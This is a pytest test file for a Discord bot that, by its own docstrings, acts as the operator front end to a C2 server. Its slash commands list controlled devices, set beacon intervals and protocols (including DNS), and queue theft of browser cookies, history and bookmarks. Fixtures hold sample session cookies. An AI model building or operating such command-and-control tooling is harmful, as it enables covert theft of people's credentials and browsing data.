"""Tests for the Discord bot slash commands, access control, and logging."""

import sys
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
import pytest_asyncio  # noqa: F401 — ensures the plugin is loaded

import discord
from discord import app_commands
from discord.ext import commands

# Ensure the project root (discord-bot/) is on sys.path.
sys.path.insert(0, ".")

from config import (  # noqa: E402
    ADMIN_DISCORD_ID,
    VALID_BEACON_INTERVALS,
    VALID_COMMUNICATION_PROTOCOLS,
)
from bot import (  # noqa: E402
    bot,
    device_manager,
    is_admin_user,
    log_command,
    log_access_denied,
    call_server,
    format_server_devices,
    format_server_cookies,
    format_server_simple,
    format_server_results,
    beacon_interval_autocomplete,
    protocol_autocomplete,
)

# Slash command callbacks — the decorator wraps them as Command objects,
# so we access .callback to get the raw coroutine for testing.
import bot as bot_module  # noqa: E402

show_devices = bot_module.show_devices.callback  # type: ignore[union-attr]
set_beacon_interval = bot_module.set_beacon_interval.callback  # type: ignore[union-attr]
request_cookies = bot_module.request_cookies.callback  # type: ignore[union-attr]
set_communication_protocol = bot_module.set_communication_protocol.callback  # type: ignore[union-attr]
request_history = bot_module.request_history.callback  # type: ignore[union-attr]
request_bookmarks = bot_module.request_bookmarks.callback  # type: ignore[union-attr]
show_results = bot_module.show_results.callback  # type: ignore[union-attr]


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _make_interaction(
    author_id: int = ADMIN_DISCORD_ID,
) -> MagicMock:
    """Create a mocked discord.Interaction for slash commands."""
    interaction = MagicMock(spec=discord.Interaction)

    # User
    interaction.user = MagicMock(spec=discord.Member)
    interaction.user.id = author_id
    interaction.user.__str__ = lambda self: "TestUser#1234"

    # Guild & Channel
    interaction.guild = MagicMock()
    interaction.guild.name = "test-guild"
    interaction.channel = MagicMock()
    interaction.channel.name = "test-channel"

    # Response
    interaction.response = MagicMock()
    interaction.response.send_message = AsyncMock()

    return interaction


# ---------------------------------------------------------------------------
# Access control tests
# ---------------------------------------------------------------------------

class TestIsAdminUser:
    """Tests for the is_admin_user check."""

    def test_admin_user_is_allowed(self) -> None:
        interaction = _make_interaction(author_id=ADMIN_DISCORD_ID)
        assert is_admin_user(interaction) is True

    def test_non_admin_user_is_denied(self) -> None:
        interaction = _make_interaction(author_id=999999999999999999)
        assert is_admin_user(interaction) is False

    def test_zero_id_is_denied(self) -> None:
        interaction = _make_interaction(author_id=0)
        assert is_admin_user(interaction) is False


# ---------------------------------------------------------------------------
# Logging tests
# ---------------------------------------------------------------------------

class TestLogging:
    """Tests for the logging helper functions."""

    def test_log_command_does_not_raise(self) -> None:
        interaction = _make_interaction()
        # Should not raise any exception
        log_command(interaction, "test-command", "arg=value")

    def test_log_command_without_args(self) -> None:
        interaction = _make_interaction()
        log_command(interaction, "test-command")

    def test_log_command_in_dm(self) -> None:
        interaction = _make_interaction()
        interaction.guild = None
        log_command(interaction, "test-command")

    def test_log_access_denied_does_not_raise(self) -> None:
        interaction = _make_interaction(author_id=0)
        log_access_denied(interaction, "test-command")


# ---------------------------------------------------------------------------
# Server bridge (call_server) tests
# ---------------------------------------------------------------------------

class TestCallServer:
    """Tests for the HTTP bridge to the C2 server."""

    @pytest.mark.asyncio
    async def test_returns_none_on_connection_error(self) -> None:
        # call_server to a port that doesn't exist
        import bot as b
        original_url = b.C2_SERVER_URL
        try:
            # Patch at module level
            b.C2_SERVER_URL = "http://localhost:19999"
            # Re-import won't help, use the patched module
            from bot import call_server as cs
            # Actually we need to mock this differently
            with patch("bot.C2_SERVER_URL", "http://localhost:19999"):
                result = await call_server("/health")
            assert result is None
        finally:
            b.C2_SERVER_URL = original_url

    @pytest.mark.asyncio
    async def test_returns_none_on_http_error(self) -> None:
        mock_response = MagicMock()
        mock_response.status_code = 500

        mock_client = AsyncMock()
        mock_client.get = AsyncMock(return_value=mock_response)
        mock_client.__aenter__ = AsyncMock(return_value=mock_client)
        mock_client.__aexit__ = AsyncMock(return_value=False)

        with patch("bot.httpx.AsyncClient", return_value=mock_client):
            result = await call_server("/health")
        assert result is None


# ---------------------------------------------------------------------------
# Format helpers tests
# ---------------------------------------------------------------------------

class TestFormatHelpers:
    """Tests for the server response formatting functions."""

    def test_format_server_devices_with_devices(self) -> None:
        data = {
            "status": "success",
            "message": "Found 2 device(s)",
            "data": {
                "devices": [
                    {"name": "dev-a", "ip": "1.1.1.1", "status": "online"},
                    {"name": "dev-b", "ip": "2.2.2.2", "status": "offline"},
                ]
            },
        }
        result = format_server_devices(data)
        assert "dev-a" in result
        assert "dev-b" in result
        assert "🟢" in result
        assert "🔴" in result

    def test_format_server_devices_empty(self) -> None:
        data = {
            "status": "success",
            "message": "No devices",
            "data": {"devices": []},
        }
        result = format_server_devices(data)
        assert "No devices" in result

    def test_format_server_cookies(self) -> None:
        data = {
            "status": "success",
            "message": "Retrieved 1 cookie(s)",
            "data": {
                "cookies_by_device": {
                    "dev-a": {"session": "abc123"},
                }
            },
        }
        result = format_server_cookies(data)
        assert "🍪" in result
        assert "session" in result
        assert "abc123" in result

    def test_format_server_cookies_empty(self) -> None:
        data = {
            "status": "success",
            "message": "No cookies",
            "data": {"cookies_by_device": {}},
        }
        result = format_server_cookies(data)
        assert "No cookies" in result

    def test_format_server_simple_success(self) -> None:
        data = {"status": "success", "message": "Interval set to 16"}
        result = format_server_simple(data)
        assert "✅" in result
        assert "16" in result

    def test_format_server_simple_error(self) -> None:
        data = {"status": "error", "message": "Invalid value"}
        result = format_server_simple(data)
        assert "❌" in result


# ---------------------------------------------------------------------------
# Slash command tests — admin user (standalone fallback)
# ---------------------------------------------------------------------------

class TestShowDevicesCommand:
    """Tests for the /show-devices slash command."""

    @pytest.mark.asyncio
    async def test_admin_gets_response(self) -> None:
        interaction = _make_interaction()
        with patch("bot.call_server", return_value=None):
            await show_devices(interaction)
        interaction.response.send_message.assert_called_once()
        sent_text = interaction.response.send_message.call_args[0][0]
        assert "Managed Devices" in sent_text

    @pytest.mark.asyncio
    async def test_non_admin_gets_denied(self) -> None:
        interaction = _make_interaction(author_id=999)
        await show_devices(interaction)
        interaction.response.send_message.assert_called_once()
        sent_text = interaction.response.send_message.call_args[0][0]
        assert "Access denied" in sent_text

    @pytest.mark.asyncio
    async def test_uses_server_response_when_available(self) -> None:
        interaction = _make_interaction()
        server_data = {
            "status": "success",
            "message": "Found 1 device(s)",
            "data": {
                "devices": [
                    {"name": "srv-dev", "ip": "10.0.0.1", "status": "online"},
                ]
            },
        }
        with patch("bot.call_server", return_value=server_data):
            await show_devices(interaction)
        sent_text = interaction.response.send_message.call_args[0][0]
        assert "srv-dev" in sent_text


class TestSetBeaconIntervalCommand:
    """Tests for the /set-beacon-interval slash command."""

    @pytest.mark.asyncio
    async def test_valid_interval(self) -> None:
        interaction = _make_interaction()
        with patch("bot.call_server", return_value=None):
            await set_beacon_interval(interaction, 30)
        sent_text = interaction.response.send_message.call_args[0][0]
        assert "✅" in sent_text
        assert "30" in sent_text

    @pytest.mark.asyncio
    async def test_invalid_interval(self) -> None:
        interaction = _make_interaction()
        with patch("bot.call_server", return_value=None):
            await set_beacon_interval(interaction, 99)
        sent_text = interaction.response.send_message.call_args[0][0]
        assert "❌" in sent_text

    @pytest.mark.asyncio
    async def test_non_admin_gets_denied(self) -> None:
        interaction = _make_interaction(author_id=999)
        await set_beacon_interval(interaction, 30)
        sent_text = interaction.response.send_message.call_args[0][0]
        assert "Access denied" in sent_text


class TestRequestCookiesCommand:
    """Tests for the /request-cookies slash command."""

    @pytest.mark.asyncio
    async def test_admin_gets_cached_cookies_and_queue_message(self) -> None:
        interaction = _make_interaction()
        cookie_data = {
            "status": "success",
            "message": "Retrieved 1 cookie(s)",
            "data": {
                "cookies_by_device": {
                    "POCO_F5": {"session": "abc123"},
                }
            },
        }
        queue_data = {
            "status": "success",
            "message": "Task 'request-cookies' queued for 1 device(s)",
        }

        async def mock_call_server(path, **kwargs):
            if path == "/admin/cookies":
                return cookie_data
            elif path == "/admin/queue-task":
                return queue_data
            return None

        with patch("bot.call_server", side_effect=mock_call_server):
            await request_cookies(interaction)
        sent_text = interaction.response.send_message.call_args[0][0]
        assert "session" in sent_text
        assert "📡" in sent_text
        assert "queued" in sent_text.lower()

    @pytest.mark.asyncio
    async def test_server_unreachable_shows_fallback_and_queue_error(self) -> None:
        interaction = _make_interaction()
        with patch("bot.call_server", return_value=None):
            await request_cookies(interaction)
        sent_text = interaction.response.send_message.call_args[0][0]
        assert "Cookies" in sent_text
        assert "could not be queued" in sent_text

    @pytest.mark.asyncio
    async def test_non_admin_gets_denied(self) -> None:
        interaction = _make_interaction(author_id=999)
        await request_cookies(interaction)
        sent_text = interaction.response.send_message.call_args[0][0]
        assert "Access denied" in sent_text


class TestSetCommunicationProtocolCommand:
    """Tests for the /set-communication-protocol slash command."""

    @pytest.mark.asyncio
    async def test_valid_protocol(self) -> None:
        interaction = _make_interaction()
        with patch("bot.call_server", return_value=None):
            await set_communication_protocol(interaction, "dns")
        sent_text = interaction.response.send_message.call_args[0][0]
        assert "✅" in sent_text
        assert "dns" in sent_text

    @pytest.mark.asyncio
    async def test_invalid_protocol(self) -> None:
        interaction = _make_interaction()
        with patch("bot.call_server", return_value=None):
            await set_communication_protocol(interaction, "ftp")
        sent_text = interaction.response.send_message.call_args[0][0]
        assert "❌" in sent_text

    @pytest.mark.asyncio
    async def test_non_admin_gets_denied(self) -> None:
        interaction = _make_interaction(author_id=999)
        await set_communication_protocol(interaction, "dns")
        sent_text = interaction.response.send_message.call_args[0][0]
        assert "Access denied" in sent_text


class TestRequestHistoryCommand:
    """Tests for the /request-history slash command."""

    @pytest.mark.asyncio
    async def test_admin_queues_for_all_devices_by_default(self) -> None:
        interaction = _make_interaction()
        server_data = {
            "status": "success",
            "message": "Task 'request-history' queued for 3 device(s)",
        }
        with patch("bot.call_server", return_value=server_data) as mock_call:
            await request_history(interaction)
            mock_call.assert_called_once_with(
                "/admin/queue-task",
                method="POST",
                json_body={
                    "device_name": "*",
                    "task_type": "request-history",
                    "parameters": {},
                },
            )
        sent_text = interaction.response.send_message.call_args[0][0]
        assert "✅" in sent_text

    @pytest.mark.asyncio
    async def test_admin_queues_for_specific_device(self) -> None:
        interaction = _make_interaction()
        server_data = {
            "status": "success",
            "message": "Task 'request-history' queued for POCO_F5",
        }
        with patch("bot.call_server", return_value=server_data) as mock_call:
            await request_history(interaction, device="POCO_F5")
            mock_call.assert_called_once_with(
                "/admin/queue-task",
                method="POST",
                json_body={
                    "device_name": "POCO_F5",
                    "task_type": "request-history",
                    "parameters": {},
                },
            )

    @pytest.mark.asyncio
    async def test_non_admin_gets_denied(self) -> None:
        interaction = _make_interaction(author_id=999)
        await request_history(interaction)
        sent_text = interaction.response.send_message.call_args[0][0]
        assert "Access denied" in sent_text

    @pytest.mark.asyncio
    async def test_server_unreachable_shows_error(self) -> None:
        interaction = _make_interaction()
        with patch("bot.call_server", return_value=None):
            await request_history(interaction)
        sent_text = interaction.response.send_message.call_args[0][0]
        assert "Server unreachable" in sent_text


class TestRequestBookmarksCommand:
    """Tests for the /request-bookmarks slash command."""

    @pytest.mark.asyncio
    async def test_admin_queues_for_all_devices_by_default(self) -> None:
        interaction = _make_interaction()
        server_data = {
            "status": "success",
            "message": "Task 'request-bookmarks' queued for 3 device(s)",
        }
        with patch("bot.call_server", return_value=server_data) as mock_call:
            await request_bookmarks(interaction)
            mock_call.assert_called_once_with(
                "/admin/queue-task",
                method="POST",
                json_body={
                    "device_name": "*",
                    "task_type": "request-bookmarks",
                    "parameters": {},
                },
            )
        sent_text = interaction.response.send_message.call_args[0][0]
        assert "✅" in sent_text

    @pytest.mark.asyncio
    async def test_admin_queues_for_specific_device(self) -> None:
        interaction = _make_interaction()
        server_data = {
            "status": "success",
            "message": "Task 'request-bookmarks' queued for POCO_F5",
        }
        with patch("bot.call_server", return_value=server_data) as mock_call:
            await request_bookmarks(interaction, device="POCO_F5")
            mock_call.assert_called_once_with(
                "/admin/queue-task",
                method="POST",
                json_body={
                    "device_name": "POCO_F5",
                    "task_type": "request-bookmarks",
                    "parameters": {},
                },
            )

    @pytest.mark.asyncio
    async def test_non_admin_gets_denied(self) -> None:
        interaction = _make_interaction(author_id=999)
        await request_bookmarks(interaction)
        sent_text = interaction.response.send_message.call_args[0][0]
        assert "Access denied" in sent_text

    @pytest.mark.asyncio
    async def test_server_unreachable_shows_error(self) -> None:
        interaction = _make_interaction()
        with patch("bot.call_server", return_value=None):
            await request_bookmarks(interaction)
        sent_text = interaction.response.send_message.call_args[0][0]
        assert "Server unreachable" in sent_text


# ---------------------------------------------------------------------------
# Autocomplete tests
# ---------------------------------------------------------------------------

class TestBeaconIntervalAutocomplete:
    """Tests for the beacon interval autocomplete callback."""

    @pytest.mark.asyncio
    async def test_returns_all_options_when_empty(self) -> None:
        interaction = _make_interaction()
        choices = await beacon_interval_autocomplete(interaction, "")
        assert len(choices) == len(VALID_BEACON_INTERVALS)

    @pytest.mark.asyncio
    async def test_filters_by_prefix(self) -> None:
        interaction = _make_interaction()
        choices = await beacon_interval_autocomplete(interaction, "1")
        values = [c.value for c in choices]
        assert 15 in values
        assert 120 in values
        assert 30 not in values

    @pytest.mark.asyncio
    async def test_returns_choice_objects(self) -> None:
        interaction = _make_interaction()
        choices = await beacon_interval_autocomplete(interaction, "")
        for choice in choices:
            assert isinstance(choice, app_commands.Choice)


class TestProtocolAutocomplete:
    """Tests for the protocol autocomplete callback."""

    @pytest.mark.asyncio
    async def test_returns_all_options_when_empty(self) -> None:
        interaction = _make_interaction()
        choices = await protocol_autocomplete(interaction, "")
        assert len(choices) == len(VALID_COMMUNICATION_PROTOCOLS)

    @pytest.mark.asyncio
    async def test_filters_by_prefix(self) -> None:
        interaction = _make_interaction()
        choices = await protocol_autocomplete(interaction, "http")
        values = [c.value for c in choices]
        assert "http" in values
        assert "https" in values
        assert "dns" not in values

    @pytest.mark.asyncio
    async def test_returns_choice_objects(self) -> None:
        interaction = _make_interaction()
        choices = await protocol_autocomplete(interaction, "")
        for choice in choices:
            assert isinstance(choice, app_commands.Choice)

    @pytest.mark.asyncio
    async def test_case_insensitive_filter(self) -> None:
        interaction = _make_interaction()
        choices = await protocol_autocomplete(interaction, "DNS")
        # 'DNS'.lower() = 'dns', should match 'dns'
        values = [c.value for c in choices]
        assert "dns" in values


# ---------------------------------------------------------------------------
# format_server_results
# ---------------------------------------------------------------------------

class TestFormatServerResults:
    """Tests for format_server_results()."""

    def _make_results_response(self, device: str = "POCO_F5", task_type: str = "request-cookies") -> dict:
        return {
            "status": "success",
            "message": "2 result(s) across 1 device(s)",
            "data": {
                "results_by_device": {
                    device: {
                        task_type: {
                            "task_id": "abc-123",
                            "data": {"output": "google.com: session=xyz"},
                            "success": True,
                            "received_at": "2025-01-15T10:30:45Z",
                        }
                    }
                }
            },
        }

    def test_no_results_returns_empty_message(self) -> None:
        data = {"status": "success", "message": "0 result(s)", "data": {"results_by_device": {}}}
        result = format_server_results(data)
        assert "No task results" in result

    def test_contains_device_name(self) -> None:
        result = format_server_results(self._make_results_response("POCO_F5"))
        assert "POCO_F5" in result

    def test_contains_task_type(self) -> None:
        result = format_server_results(self._make_results_response())
        assert "request-cookies" in result

    def test_contains_success_emoji(self) -> None:
        result = format_server_results(self._make_results_response())
        assert "✅" in result

    def test_contains_cookie_emoji_for_cookies(self) -> None:
        result = format_server_results(self._make_results_response(task_type="request-cookies"))
        assert "🍪" in result

    def test_contains_history_emoji_for_history(self) -> None:
        result = format_server_results(self._make_results_response(task_type="request-history"))
        assert "📜" in result

    def test_contains_output_data(self) -> None:
        result = format_server_results(self._make_results_response())
        assert "google.com" in result

    def test_truncates_long_response(self) -> None:
        big_output = "\n".join([f"line {i}" for i in range(200)])
        data = {
            "status": "success",
            "message": "1 result(s) across 1 device(s)",
            "data": {
                "results_by_device": {
                    "device": {
                        "request-history": {
                            "task_id": "x",
                            "data": {"output": big_output},
                            "success": True,
                            "received_at": "2025-01-15T10:00:00Z",
                        }
                    }
                }
            },
        }
        result = format_server_results(data)
        assert len(result) <= 2000


# ---------------------------------------------------------------------------
# /show-results command
# ---------------------------------------------------------------------------

class TestShowResults:
    """Tests for the /show-results slash command."""

    @pytest.mark.asyncio
    async def test_access_denied_for_non_admin(self) -> None:
        interaction = _make_interaction(author_id=999)
        await show_results(interaction)
        interaction.response.send_message.assert_called_once()
        args = interaction.response.send_message.call_args
        assert "Access denied" in args[0][0]

    @pytest.mark.asyncio
    async def test_server_response_formatted(self) -> None:
        interaction = _make_interaction()
        server_data = {
            "status": "success",
            "message": "1 result(s) across 1 device(s)",
            "data": {
                "results_by_device": {
                    "POCO_F5": {
                        "request-cookies": {
                            "task_id": "t-1",
                            "data": {"output": "google.com: s=abc"},
                            "success": True,
                            "received_at": "2025-01-15T10:00:00Z",
                        }
                    }
                }
            },
        }
        with patch("bot.call_server", new_callable=AsyncMock) as mock_server:
            mock_server.return_value = server_data
            await show_results(interaction)
        interaction.response.send_message.assert_called_once()
        response_text = interaction.response.send_message.call_args[0][0]
        assert "POCO_F5" in response_text
        assert "request-cookies" in response_text

    @pytest.mark.asyncio
    async def test_server_unreachable_shows_error(self) -> None:
        interaction = _make_interaction()
        with patch("bot.call_server", new_callable=AsyncMock) as mock_server:
            mock_server.return_value = None
            await show_results(interaction)
        response_text = interaction.response.send_message.call_args[0][0]
        assert "❌" in response_text

    @pytest.mark.asyncio
    async def test_no_results_shows_empty_message(self) -> None:
        interaction = _make_interaction()
        empty_data = {
            "status": "success",
            "message": "0 result(s) across 0 device(s)",
            "data": {"results_by_device": {}},
        }
        with patch("bot.call_server", new_callable=AsyncMock) as mock_server:
            mock_server.return_value = empty_data
            await show_results(interaction)
        response_text = interaction.response.send_message.call_args[0][0]
        assert "No task results" in response_text
